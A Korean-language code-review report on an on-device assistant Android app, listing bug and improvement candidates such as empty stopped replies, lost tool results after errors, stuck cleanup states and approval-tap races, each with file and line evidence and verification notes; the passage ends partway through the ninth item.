# 개선 후보 탐색 (2026-11-20, 0.42.10 기준)

> 읽기 전용 탐색 결과다 — 계획서가 아니다. 영역별 탐색 뒤 다른 에이전트가 코드·CHANGELOG·ADR 과 대조해 반박을 시도했다(실행·실측 없음, 코드 읽기만).
> 회차로 옮길 때는 항목마다 다시 확인한다. "모델 입력" 표시는 실측 선행(AGENTS §2-⑤).


## 비서 핵심 흐름 (core)

### core-1 · 중지 버튼으로 답이 비면 빈 비서 말풍선이 그대로 저장된다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 실사용에서 흔한 동작이다. 첫 글자가 나오기 전에 중지를 누르거나, 웹 검색·승인 대기 중에 중지를 누르면 내용이 빈 비서 메시지가 DB 와 화면에 남는다. 특히 툴이 이미 실행된 뒤(일정이 추가된 뒤)라면 "추가했어요" 같은 확인 문장 없이 빈 말풍선만 남아 사용자는 됐는지 알 수 없고, 빈 답은 다음 턴의 모델 기록에도 실린다. 런타임 주석이 약속한 처리가 실제로는 없다(주석과 코드 불일치는 면접에서 약점).
- 제안: BaseAgent 루프 뒤에 "최종 글이 비었는가"를 판정하는 분기를 넣는다. (가) 실행된 툴이 없으면 비서 메시지를 저장하지 않고 화면에도 추가하지 않는다(AgentResult 에 '중지됨' 표시 또는 빈 Text 를 ViewModel 이 버림). (나) 쓰기 툴이 성공한 뒤라면 앱 문장(예: "추가는 끝났어요. 답은 중지됐어요.")으로 대체해 저장하고 대화를 다시 만들도록 invalidateConversation 을 부른다. 승인 대기 중 중지·첫 글자 전 중지 두 경우를 BaseAgent 단위 테스트로 고정한다. 앱이 쓰는 문장이라 모델 입력은 바뀌지 않는다.
- 근거:
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:276-281 — 턴 사이(승인 대기·툴 실행 중)에 누른 중지는 다음 채팅 턴을 ModelTurn("", 빈 목록) 성공으로 끝낸다
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:359-363 — 주석이 "빈 말풍선을 안 남기는 처리는 BaseAgent 의 몫"이라고 적어 둠
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:317-364 — 루프 뒤 text 가 비었는지 보는 분기가 없고 messageWriter.save 로 그대로 저장, AgentResult.Text(빈 글) 반환
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:590-626 — 받은 답을 내용 검사 없이 메시지 목록에 추가
- 검증: 직접 확인: GemmaModelRunner.kt runTurn 의 `if (!prompt.oneShot && cancellation.consumePending()) { discardCachedConversation(); return Success(ModelTurn("", emptyList())) }`(약 278-281줄), 스트리밍 성공 분기 주석 '빈 말풍선을 안 남김은 BaseAgent 의 몫'(약 359-363줄). BaseAgent.kt:164·314 — 툴 호출이 없으면 그대로 break, 317-318 text="" , ReplyFinisher.finish 는 빈 글이면 Keep(ReplyFinisher.kt:52-59), 357-364 에서 빈 content 로 저장, 368 에서 AgentResult.Text("") 반환. ChatViewModel.kt:590-626 은 내용 검사 없이 목록에 추가하고, ChatBubbles.kt 에도 content 가 비었는지 보는 분기가 없다(grep). AssistantMessageWriter.save·ConversationRepositoryImpl 에도 빈 글 거르기 없음. 테스트에도 이 경우를 고정한 것이 없다(app/src/test agent 폴더에 중지·cancel 검색 0건). 보정할 세부: (1) 승인 시트는 모달이라 '승인 대기 중 중지'는 누르기 어렵고, 실제 경로는 '첫 글자 전 중지'와 '툴 실행(웹 검색 등) 중 중지' 두 가지다. (2) 툴이 성공한 뒤라면 결과 카드(messageResult, BaseAgent.kt:272·363)는 빈 말풍선에 붙어 나오므로 '됐는지 전혀 모른다'는 표현은 과장 — 글이 비는 것이 문제다. (3) 빈 비서 메시지는 다음 턴 DB 히스토리에 그대로 실린다(RefusalTurns.forModel 은 빈 글을 거르지 않음).
- 앞선 기록: CHANGELOG 0.38.6(683줄) — 턴 사이 중지는 다음 채팅 턴을 시작하지 않고, 사용자 취소는 받은 만큼을 답으로 남긴다고 기록. 빈 답을 어떻게 할지는 CHANGELOG·architecture·plans 어디에도 없음('빈 말풍선' 기록은 무음 녹음 건뿐)

### core-2 · 쓰기 툴이 실행된 뒤 턴이 오류로 끝나면 이미 한 일이 화면에 남지 않는다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 0.40.2 에서 "추가됨 + 오류가 동시에 보이는" 문제를 상한 차례의 호출에 대해서만 막았다. 승인해서 일정이 실제로 추가된 뒤 확인 답을 만드는 추론이 실패하면(승인 시트를 보는 사이 발열 임계 도달, 앱을 잠깐 나갔다 와서 엔진이 내려감) 사용자는 오류 말풍선만 보고 다시 부탁해 일정이 두 번 들어갈 수 있다. 개인 비서의 핵심 약속(무엇을 했는지 정확히 알려 줌)이 깨지는 경로다.
- 제안: 루프 안에서 "이번 턴에 성공한 쓰기 목록(대상 이름)"을 유지하고, 오류로 끝나는 두 분기(추론 실패·반복 상한)에서 그 목록이 비어 있지 않으면 partialReply 와 같은 앱 문장("추가했어요: '치과'. 다만 답을 만들지 못했어요.")을 결과 카드와 함께 일반 답으로 저장한다(오류 스낵바는 유지). 두 분기 모두 invalidateConversation 을 불러 다음 턴이 DB 기록으로 대화를 다시 만들게 한다. 앱 문장이라 모델 입력 변화는 없다.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:151-160 — 툴 회신 뒤 두 번째 추론이 실패하면(발열 차단·엔진 내려감·시간 초과) saveError 만 하고 반환, 앞에서 모은 messageResult·searchUsed·실행 결과를 버림
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:165-185 — 반복 상한(3번째 차례)에서도 1·2번째 차례에 이미 실행된 쓰기와 무관하게 오류 말풍선만 남김
  - app/src/main/java/com/kosmos/app/assistant/orchestrator/AssistantMessageWriter.kt:69-79 — saveError 는 결과 카드·한 일 목록을 받을 인자가 없음
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:266-275 — 엔진 미준비·발열 사전 검사는 대화를 버리지 않고 반환하므로, 발열 실패 때는 회신 없는 툴 호출이 살아 있는 대화에 남는데 BaseAgent 실패 분기(153줄)는 invalidateConversation 을 부르지 않음
- 검증: 직접 확인: BaseAgent.kt:151-160 — 추론 실패면 messageWriter.saveError 만 하고 반환, 그때까지 모은 messageResult·searchUsed·results 는 버려지고 invalidateConversation 도 없다. 165-185 — 상한 분기도 앞 차례에서 성공한 쓰기와 무관하게 오류 말풍선만(여기는 invalidate 있음). AssistantMessageWriter.kt saveError 는 result 인자가 없다(69-79줄). 대화가 살아남는 경로도 확인: GemmaModelRunner runTurn 은 발열 사전 검사 실패(checkPreconditions)를 대화를 버리기 전에 반환하고(약 272-275줄), ConversationPolicy.kt:48-69 의 재사용 판정 키는 세션·시스템 지시·툴 목록·KV 량뿐이라 다음 사용자 턴이 회신 없는 툴 호출이 남은 대화를 그대로 재사용한다. 보정: 추론 도중 실패·시간 초과는 runner 의 finally 가 스스로 대화를 버리고(turnFailed), 엔진이 내려간 경우는 대화가 이미 null 이라 무효화가 빠진 실질 경로는 '발열 차단' 하나다. 한 일이 화면에 안 남는 문제(오류 말풍선만, 결과 카드 없음)는 세 실패 원인 모두에 해당.
- 앞선 기록: CHANGELOG 0.40.2 M1(564줄)·docs/plans/0.40.2-bug-fixes.md:47-51 — 상한 차례(3번째)의 툴 호출만 실행 전 차단하고 그 분기에만 invalidateConversation 추가. 1·2번째 차례에서 이미 실행된 쓰기 뒤의 실패는 기록 없음

### core-3 · 기억 정리 '적용 중'에 화면을 나가면 상태가 '적용 중'에 영구히 멈춘다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 대화 합치기는 재요약 추론이라 수십 초 걸려, 기다리다 뒤로 가기를 누르는 것이 자연스럽다. 그러면 (1) 싱글턴 실행기의 상태가 Applying 으로 남아 정리 화면에 다시 들어가도 끝나지 않는 진행 표시만 보이고, (2) "묶음이 반쯤 적용된 채 끊기지 않게 취소를 없앴다"는 0.31.0 의 의도와 반대로 적용이 중간에 끊긴다. 실행기는 화면을 떠나도 계속 돈다고 문서에 적혀 있는데 적용 단계만 화면 수명에 묶여 있다.
- 제안: apply 를 실행기 자신의 scope 에서 돌린다(start 처럼 job 을 띄우고 ViewModel 은 runner.apply(...) 를 일반 함수로 호출). 그리고 본문을 try/finally 로 감싸 어떤 끝남(취소·예외)에도 Done(interrupted = true) 또는 Idle 로 상태를 옮긴다. 같은 김에 실행기 scope 에 CoroutineExceptionHandler 를 달아(ConversationPrewarmer 전례) 계획·적용 유스케이스의 예상 밖 예외가 앱을 죽이지 않고 Blocked/Done 으로 보이게 한다. 실행기 테스트에 "적용 중 호출자 취소 → 상태가 Applying 에 남지 않음"을 추가.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/cleanup/MemoryCleanupRunner.kt:171-180 — apply 는 호출자의 코루틴에서 돌고 try/finally 가 없어, 취소되면 State.Applying 에서 다음 상태로 가지 못함
  - app/src/main/java/com/kosmos/app/feature/cleanup/MemoryCleanupViewModel.kt:62 — viewModelScope.launch { runner.apply(...) } — 화면을 뒤로 나가면 ViewModel 이 지워지며 취소됨(MemoryCleanupScreen.kt:56 hiltViewModel)
  - app/src/main/java/com/kosmos/app/feature/cleanup/MemoryCleanupScreen.kt:102-106 — Applying 화면은 진행 표시만 있고 취소·다시 시작 버튼이 없음(onCancel = null)
  - app/src/main/java/com/kosmos/app/assistant/cleanup/MemoryCleanupRunner.kt:194-203, 206-208 — cancel() 은 Applying 이면 표시만 하고 돌아가며, reset() 은 Done 화면에서만 불림 — 빠져나올 길이 앱 강제 종료뿐
- 검증: 직접 확인: MemoryCleanupRunner.kt:171-180 — apply 는 호출자 코루틴에서 돌고 try/finally 없음, 174 에서 Applying 으로 바꾼 뒤 179 의 Done 대입은 정상 종료 때만. MemoryCleanupViewModel.kt:62 `viewModelScope.launch { runner.apply(...) }`, MemoryCleanupScreen.kt:56 hiltViewModel()(내비 항목 수명) — 뒤로 가면 취소된다. applyMerge(DB)·applyEpisodeMerge(추론, withContext 경계)는 취소 가능한 중단점이라 중간에 끊긴다. 빠져나올 길 없음도 확인: Screen 102-106 Applying 은 onCancel=null 진행 표시뿐, Runner.cancel() 198-201 은 Applying 이면 표시만 하고 return, reset() 은 Done 화면에서만 호출, start() 는 Idle·Blocked 화면에서만 닿는다. 싱글턴이라 앱 프로세스가 죽을 때까지 유지. 실행기 테스트(MemoryCleanupRunnerTest)에 호출자 취소 경우 없음. 고칠 때 주의: apply 를 기존 `job` 에 넣으면 onStop 의 cancel() 이 적용을 끊어 0.41.14 D1(끝난 건수 유지 + interrupted 표시) 동작이 바뀐다 — 별도 작업 변수로 두거나 finally 로 상태만 보장하는 쪽이 안전.
- 앞선 기록: docs/plans/0.41.14-app-robustness.md:12·21 — apply() 가 job 밖임을 알고 있었고, 결정 D1 은 '적용 중 백그라운드'만 Done.interrupted 로 처리. CHANGELOG 0.31.0(903줄) — 적용 중 취소 버튼 없음(의도). 화면을 뒤로 나가 ViewModel 이 지워지는 경우는 기록 없음

### core-4 · 시작 단계에서 요약한 대화의 사실 추출이 메모리에만 예약돼 짧게 쓰고 나가면 영영 안 된다
- 판정 확인됨 · 중요도 중간 · 크기 M
- 왜: 매일 실사용의 전형은 "열고 → 한두 마디 → 60초 안에 나감"이다. 이 흐름에서 지난 대화는 다음에 앱을 열 때 시작 단계가 요약하고(추출은 뒤로), 추출은 그 뒤 60초 조용한 창이 엔진이 켜진 채로 와야만 돈다. 사용자가 먼저 나가면 대기가 끝난 뒤 엔진 없이 드레인이 돌아 표시만 지우고 실패하거나, 프로세스가 죽으면 표시 자체가 사라진다. 요약은 같은 상황을 "실패로 세지 않고 다음 실행으로" 넘기는데(272-275줄) 추출만 조용히 잃는다 — 자동 기억(프로필 제안·지식 저장)이 실사용 패턴에서 구조적으로 덜 쌓인다.
- 제안: "추출을 했는가"를 DB 에 둔다. 가장 작게는 에피소드에 추출 완료 시각(또는 불린) 열을 추가하고(스키마 한 단계), catchUp 이 SUMMARIZED·미추출·최근 N일 것을 추출 전용으로 큐에 넣는다. 스키마를 건드리지 않으려면 (1) 추출 경로에서 엔진 상태가 Ready 가 아니면 표시를 지우지 말고 그대로 두고, (2) 추출 실패가 ModelNotReady 면 표시를 되돌린다 — 이 경우 프로세스가 죽는 경우만 남는다. 어느 쪽이든 "백그라운드에서 조용한 창이 끝남 → 추출 표시 유지" 테스트를 추가한다.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/episode/EpisodeSummarizeScheduler.kt:127-130 — 시작 단계 요약은 항상 extract = false
  - app/src/main/java/com/kosmos/app/assistant/episode/EpisodeSummarizeScheduler.kt:82, 258-263 — 미룬 추출은 pendingExtractions(프로세스 메모리의 집합)에만 표시되고 에피소드는 이미 SUMMARIZED
  - app/src/main/java/com/kosmos/app/assistant/episode/EpisodeSummarizeScheduler.kt:229-239 — 추출만 하는 경로는 시도 전에 표시를 지우고, 실패해도(엔진 내려감 포함) 되돌리지 않음
  - app/src/main/java/com/kosmos/app/assistant/episode/EpisodeSummarizeScheduler.kt:340-344 — 복구(catchUp)는 CLOSED 만 다시 넣어 SUMMARIZED·미추출은 다시 잡히지 않음
  - core/src/main/java/com/kosmos/app/core/common/Constants.kt:226 — 조용한 창은 60초; app/src/main/java/com/kosmos/app/KosmosApp.kt:105-116 — 백그라운드로 가면 엔진을 내리지만 스케줄러의 대기는 취소하지 않음
- 검증: 직접 확인: EpisodeSummarizeScheduler.kt:128 시작 단계는 extract=false, 258-263 에서 메모리 집합 pendingExtractions 에만 표시(82줄, 에피소드는 이미 SUMMARIZED), 229-239 추출 전용 경로는 시도 전에 231 에서 표시를 지우고 실패해도 되돌리지 않음, 340-344 catchUp 은 CLOSED 만 큐에 넣음. KosmosApp.kt onStop(104-116)은 modelRunner.close() 는 하지만 스케줄러의 대기 작업은 건드리지 않아 60초 뒤 엔진 없이 드레인이 돈다 → EpisodeFactExtractor.extract 는 extractFacts 실패를 로그만 남기고 null(85-88줄). 프로세스가 죽으면 집합 자체가 사라진다. 요약 쪽은 같은 상황을 274-275 에서 '세지 않고 다음 실행으로' 넘기는 것과 비대칭. 심각도 판단: 원문·요약은 남고 설계상 추출 유실을 감수한다고 적혀 있어 데이터 손실은 아니지만, 시작 단계가 요약하는 대화(매일 쓰는 패턴에서는 사실상 대부분)가 구조적으로 이 경로를 타므로 medium 유지. 스키마를 안 건드리는 안(엔진이 Ready 가 아니면 표시를 지우지 않음)이 작고 충분하다.
- 앞선 기록: CHANGELOG 0.39.4 M1(604줄)·docs/plans/0.39.4-latency-2.md:34-36(pendingExtractions 도입), CHANGELOG 0.41.7 M2(379줄 — 시작 단계는 요약만, 사실 추출은 뒤로). EpisodeFactExtractor.kt:52-53 KDoc '실패는 로그만, 재시도 없음 — 지식은 다음 에피소드에서 또 나온다'(2026-09 결정)는 추론 실패에 대한 것이고, 시도조차 못 하고 표시가 사라지는 경우는 기록 없음

### core-5 · 승인·거절이 '지금 떠 있는 요청'을 가리지 않아 연속 시트에서 두 번 누르면 다음 것까지 승인된다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 승인 시트는 "쓰기는 사용자가 본 것만 실행한다"는 이 앱의 안전 장치이자 포트폴리오의 핵심 주장이다. 0.42.7 부터 한 턴에 일정 둘을 차례로 승인받는데, 같은 위치의 승인 버튼을 빠르게 두 번 누르면 두 번째 탭이 아직 읽지 않은 두 번째 요청을 승인할 수 있다(코드상 막는 장치가 없음 — 실기기 재현은 하지 않았다). 두 번째 문제(옛 대기의 finally 가 새 시트를 지움)는 지금은 호출자가 하나라 드물지만, 생기면 시트 없이 60초 뒤 자동 거절된다.
- 제안: ApprovalRequest 에 고유 id(순번이나 UUID)를 넣고 approve(id)/reject(id) 가 현재 요청의 id 와 같을 때만 완료하게 한다. ChatViewModel 은 화면 상태(uiState.pendingApproval)의 id 를 넘긴다 — 그러면 첫 시트에서 나온 늦은 탭은 버려진다. finally 는 _pendingRequest.compareAndSet(request, null) 로 자기 요청일 때만 지운다. 코디네이터 단위 테스트에 "옛 id 로 승인 → 새 요청은 대기 유지", "밀려난 대기의 종료가 새 요청을 지우지 않음"을 추가.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/approval/ApprovalCoordinator.kt:75-83 — approve()/reject() 는 요청 식별자 없이 현재 대기 중인 것을 완료
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:576-579 — 화면이 보여 준 요청이 아니라 코디네이터의 현재 요청을 consumePending 으로 꺼내 승인
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:197-218, 459-460 — 한 차례에 쓰기 여럿이면 첫 승인 직후(실행은 수십 ms) 곧바로 다음 requireApproval 이 같은 자리에 뜸("1/2" → "2/2")
  - app/src/main/java/com/kosmos/app/assistant/approval/ApprovalCoordinator.kt:49-50, 69-72 — 새 요청이 옛 요청을 밀어낼 때 옛 대기의 finally 가 _pendingRequest 를 null 로 덮어 새 요청의 시트를 지울 수 있음(값 비교 없이 대입)
- 검증: 직접 확인: ApprovalCoordinator.kt:75-83 approve/reject 는 식별자 없이 현재 대기를 완료, ChatViewModel.kt:576-579 는 consumePending 으로 코디네이터의 현재 요청을 꺼내 승인, ApprovalSheet.kt:264 승인 버튼에 연타 방지 없음(approveEnabled 는 프로필 제안용 기본 true). 그래서 '막는 장치가 없다'는 맞다. 틀리거나 부족한 부분: (1) 제안한 id 대조는 화면이 아직 옛 요청을 보여 주는 짧은 지연 구간만 막는다. 실제로 걱정되는 경우는 첫 승인 → 툴 실행(수십 ms) → 두 번째 시트가 이미 뜬 뒤 같은 자리의 두 번째 탭인데, 이때 화면 상태의 id 는 이미 새 요청 것이라 id 로는 못 막는다 — 새 시트가 뜬 직후 잠깐 승인 버튼을 막는 쪽이 실효가 있다. (2) 둘째 주장(밀려난 대기의 finally 가 새 시트를 지움, 69-72줄)은 코드상 값 비교 없는 대입이 맞지만, requireApproval 호출부는 BaseAgent.kt:460 하나뿐이고 차례로만 부르며 턴 겹침은 ChatViewModel isInFlight 가 막는다. 화면 이탈로 취소되면 finally 가 새 요청보다 먼저 돈다 — 현재 구조에서 재현 경로가 성립하지 않아 방어적 정리 수준. 실기기 재현 없음, 심각도 low.
- 앞선 기록: CHANGELOG 0.42.7 — 한 차례의 여러 호출을 차례로 실행, 시트에 순번 표시(사용자 결정). 승인 버튼 연타·요청 식별에 대한 기록은 없음(연타 기록은 0.41.9 의 화면 이동 연타뿐)

### core-6 · 턴이 중간에 끝나면(전사 실패·저장 실패·예외·화면 이탈) 턴 종료 후속 처리가 통째로 빠진다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 무음 녹음으로 전사가 실패하는 일은 실사용에서 자주 난다. 그때마다 기억 뜻 벡터 자동 준비가 "채팅 중"으로 묶이고, 보관함 벡터 만들기는 멈춘 채로, 대화 요약 대기는 취소된 채로 다음 성공한 턴까지 남는다. 그 뒤 앱을 나가면 그 세션의 요약·벡터 작업은 하지 못한다. 채팅 화면을 떠나 턴이 취소될 때와 예상 밖 예외 때도 같다 — 이때는 살아 있는 대화에 회신 없는 툴 호출이 남을 수 있는데 대화를 다시 만들라는 표시도 없다.
- 제안: processRequest 본문을 try/finally 로 감싸 "요청 시작에서 건 것"을 finally 에서 한 번에 되돌린다(onTurnCompleted, onTurnFinished 둘; afterTurn 은 정상 종료 때만). 예외·취소로 빠져나갈 때는 finally 에서 modelRunner 대화 무효화도 함께 부른다(에이전트 쪽 공개 함수 하나). BaseAgent 220·224·253줄의 optString 은 runCatching 으로 감싸거나 실행 결과가 성공일 때만 읽는다. VoiceTranscriptionFailureTest 에 "실패 뒤에도 턴 종료 훅이 불린다" 검증을 추가(기존 단언은 그대로).
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/orchestrator/AssistantOrchestrator.kt:58-67 — 요청 시작 때 요약 대기 취소·정리 취소·미리 준비 취소·벡터 만들기 멈춤을 건다
  - app/src/main/java/com/kosmos/app/assistant/orchestrator/AssistantOrchestrator.kt:87-90, 109-111, 124-126, 134-138 — 전사 실패·사용자 메시지 저장 실패·문서 저장 실패·문맥 구성 실패는 바로 return
  - app/src/main/java/com/kosmos/app/assistant/orchestrator/AssistantOrchestrator.kt:152-159 — 되돌리는 호출(onTurnCompleted·afterTurn·onTurnFinished ×2)은 정상 경로 끝에만 있고 try/finally 가 아님 — agent.execute 가 예외를 던지거나 취소돼도 건너뜀
  - app/src/main/java/com/kosmos/app/platform/memory/MemoryEmbedder.kt:116-125, 136 — chatting 표시는 onTurnFinished 만 내리고, 올라가 있으면 자동 준비가 막힘
  - app/src/main/java/com/kosmos/app/platform/document/LibraryEmbedder.kt:86-104 — Paused 는 onTurnFinished 가 와야 이어 감
  - app/src/main/java/com/kosmos/app/assistant/episode/EpisodeSummarizeScheduler.kt:135-141 — 취소된 요약 대기는 다음 onTurnCompleted 가 와야 다시 걸림
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:220, 224, 253 — 실행기 밖에서 부르는 args.optString 은 값이 배열·객체면 ToolArgumentException 을 던지는데(ToolArguments.kt:55-61) try(456-471줄) 밖이라 턴 전체가 예외로 끝나는 실제 경로
- 검증: 직접 확인: AssistantOrchestrator.kt:58-67 에서 요약 대기 취소·정리 취소·미리 준비 취소·벡터 멈춤을 걸고, 되돌리는 호출은 155-159(정상 경로 끝)에만 있다. 조기 반환 87-90(전사 실패)·109-111·124-126·134-138 은 건너뛴다. MemoryEmbedder.kt:117 chatting=true 는 123(onTurnFinished)에서만 내려가고 136 에서 자동 준비를 막는다(파일 내 chatting 사용처 4곳뿐). LibraryEmbedder.kt:86-104 Paused 는 onTurnFinished 가 와야 이어 감. EpisodeSummarizeScheduler.kt:135-141 취소된 대기는 다음 onTurnCompleted/requestCatchUp 때만 다시 걸림. 다음 성공한 턴이 오면 전부 회복되므로 영향은 '실패 뒤 바로 앱을 나간 세션'에 한정. 추가로 더 무거운 점을 확인: BaseAgent.kt:220·224·253 의 args.optString 은 try(456-471) 밖이고, ToolArguments.kt:55-61 은 값이 배열·객체면 ToolArgumentException 을 던진다. 이 예외를 잡는 곳이 위로 없다 — KosmosAgent·AssistantOrchestrator·SendChatMessageUseCase 에 catch 없음, ChatViewModel.kt:476-541 은 try/finally 만 있고 viewModelScope 에 예외 처리기 없음 → 모델이 title·content 를 배열로 내면 앱이 죽는 경로다(같은 파일 431줄은 runCatching 으로 감싸 둠). 드물지만 크래시라 이 부분만으로도 고칠 가치가 있다. 고칠 때 주의: finally 에서 onTurnCompleted 를 부르면 전사 실패 턴도 요약 대기를 다시 건다 — 의도에 맞음.
- 앞선 기록: CHANGELOG 0.39.1(634줄 — 요약을 조용한 창으로), 0.41.2(채팅 중 벡터 만들기 멈춤) — 조기 반환·예외 경로의 되돌림에 대한 기록은 CHANGELOG·architecture·plans 에 없음

### core-7 · 요약이 도는 중 앱을 나가면 '요약 실패'로 세어져 세 번이면 그 대화는 영구히 요약되지 않는다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 요약은 답을 받은 뒤 60초 조용해야 시작해 십수 초 도는데, 그 시간대가 바로 사용자가 앱을 떠나는 때다. 엔진이 내려가서 끊긴 것은 모델·대화 탓이 아닌데도 재시도 횟수를 쓰고, 같은 대화가 세 번 그러면 FAILED 로 굳어 기억 보관함과 '지난 대화 요약 한 줄'에서 빠진다. 원문은 남지만 기억 기능의 구멍이 조용히 생긴다. (cancelProcess 를 맞은 추론이 정확히 어떤 오류로 끝나는지는 실기기에서 확인하지 않았다.)
- 제안: 실패를 세기 전에 modelRunner.loadState 가 Ready 인지 한 번 더 본다 — Ready 가 아니면 ModelNotReady 와 같은 취급(세지 않고 CLOSED 유지). 추가로 catchUp 에서 FAILED 중 오래된 것(예: 7일 지난 것)을 retryCount 0 으로 한 번 되살리는 길을 두면 일시적 원인으로 굳은 대화도 구제된다. 스케줄러 테스트에 "요약 중 엔진 내려감 → 횟수 불변"을 추가.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/episode/EpisodeSummarizeScheduler.kt:272-287 — ModelNotReady 만 재시도로 세지 않고, 그 밖의 실패는 retryCount+1, 3회면 FAILED
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:537-541 — 백그라운드 전환 시 close() 가 진행 중 추론에 cancelProcess 를 직접 걸어(사용자 취소로 표시되지 않음) 일반 추론 오류 또는 깨진 출력으로 끝남
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:368-382, 420-423 — 비스트리밍 경로의 예외는 ModelInferenceError 로 바뀜
  - FAILED 를 다시 집는 코드 없음 — 저장소 전체 grep 에서 EpisodeStatus.FAILED 는 EpisodeSummarizeScheduler.kt:281 과 매퍼 기본값(EpisodeRepositoryImpl.kt:111)뿐
- 검증: 직접 확인: EpisodeSummarizeScheduler.kt:274-287 — ModelNotReady 만 세지 않고 나머지 실패는 retryCount+1, 3회면 FAILED. GemmaModelRunner.kt close()(약 539-541줄)는 cancellation.requestCancel 이 아니라 activeConversation()?.cancelProcess() 를 직접 불러 userCancelled 가 서지 않는다 → 비스트리밍 경로는 sendResult.getOrThrow() 예외가 바깥 catch 에서 ModelInferenceError 가 되거나(약 420-423줄), 끊긴 출력이 SummarizeEpisodeUseCase.kt:68-72 의 파싱 실패(Failure)로 간다. 그 시점 loadState 는 아직 Ready(해제는 뮤텍스 뒤)라 ModelNotReady 로 분류되지 않는다. FAILED 를 되살리는 코드 없음(grep: 스케줄러 281줄과 EpisodeRepositoryImpl.kt:111 매퍼 기본값뿐). 심각도를 낮게 두는 이유: 같은 대화가 세 번 연속 끊겨야 굳고, 30분 넘게 쉬었다 돌아오면 시작 단계 summarizeLatestStale(115-132줄)이 가장 최근 것을 화면을 연 채(전경)에서 요약해 대부분 한두 번 안에 구제된다. cancelProcess 를 맞은 네이티브 호출이 실제로 어떻게 끝나는지는 코드만으로는 확정 못 함(작성자도 미확인이라 명시). 제안 중 '실패를 세기 전에 loadState 확인'은 작고 타당.
- 앞선 기록: ADR-022·CHANGELOG 0.24.x(1112·1115줄 — 상태 기계와 재시도 횟수, onStop 요약 기각), CHANGELOG 0.39.1(634줄). 스케줄러 주석(272-273줄)은 '기다리는 사이 백그라운드'만 다루고 '요약이 도는 중 엔진 해제'는 기록 없음

### core-8 · 여러 호출 중 앞의 것이 실행된 뒤 대화 용량으로 멈추면 "나눠서 부탁해 주세요"만 나와 한 일이 빠진다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: "치과, 팀 미팅 둘 다 잡아줘"에서 첫 일정을 승인·추가한 뒤 두 번째가 용량으로 멈추면, 답은 아무것도 안 된 것처럼 읽힌다. 사용자가 안내대로 나눠서 다시 부탁하면 첫 일정이 두 번 들어간다. 일부 거절일 때는 무엇을 했고 안 했는지 말해 주는데(0.42.7) 용량 멈춤만 빠져 있다. 긴 대화 끝에서만 나므로 빈도는 낮다.
- 제안: 291-295줄의 when 에 "kvStopped 이고 doneWrites 가 있음" 분기를 넣어 partialReply 와 같은 형식에 멈춘 호출의 대상(calls 에서 results 뒤에 남은 것)을 '하지 않은 것'으로 넣는다. 앱 문장이라 모델 입력은 그대로다. BaseAgent 다중 호출 테스트에 한 건 추가.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:201-205 — 두 번째 호출부터 용량 검사에 걸리면 실행 전에 멈춤(kvStopped)
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:286-299 — 거절이 없고 kvStopped 면 앞에서 성공한 쓰기(doneWrites)가 있어도 KV_FULL_REPLY 고정 문장만 답으로 씀
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:579-580 — 문장: "한 번에 처리하기엔 길어요. 나눠서 부탁해 주세요."
- 검증: 직접 확인: BaseAgent.kt:201-205 두 번째 호출부터 용량 검사에 걸리면 실행 전 break(kvStopped), 286-295 — rejected 가 비고 kvStopped 면 doneWrites 가 있어도 else 분기의 KV_FULL_REPLY(579-580줄 '한 번에 처리하기엔 길어요. 나눠서 부탁해 주세요.')만 답이 된다. 완화 요소: 앞에서 성공한 툴의 결과 카드는 272줄에서 messageResult 에 담겨 363줄로 같은 말풍선에 붙으므로 흔적이 아예 없지는 않다 — 다만 글은 '아무것도 안 됨'으로 읽히고 '나눠서 다시'를 따르면 중복 추가가 된다. 대화가 천장 근처일 때만 나는 경로라 빈도 낮음. 고칠 때 주의: BaseAgentStreamTest.kt:560-580 이 이 고정 문장을 단언하고 있다 — 그 테스트가 '첫 호출도 실행 전 멈춤' 경우인지 먼저 확인하고, 새 분기는 doneWrites 가 있을 때만 타게 해 기존 단언을 건드리지 않는다.
- 앞선 기록: CHANGELOG 0.41.6 M2(394줄 — 툴 반복 용량 가드), 0.42.7(여러 호출 차례 실행·일부 거절 문장). 두 기능이 만나는 경우는 기록 없음

### core-9 · 기억 정리가 취소된 뒤에도 취소된 작업이 상태를 다시 써서 '진행 중'이 남을 수 있다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 채팅을 시작하면 정리 계획이 취소되는데(0.40.6), 그때 돌던 판정 추론은 끝까지 가고 그 뒤 첫 중단점에서야 취소가 드러난다. 유스케이스가 추론 결과를 받아 정상 반환하면 단계 사이 대입이 Idle 을 Running 이나 Blocked 로 되돌려, 설정의 정리 화면이 아무것도 돌지 않는데 '진행 중'으로 보일 수 있다(취소 버튼을 누르면 풀린다). 실제로 덮이는지는 유스케이스가 반환 직전에 취소를 확인하는지에 달려 있어 추정이다.
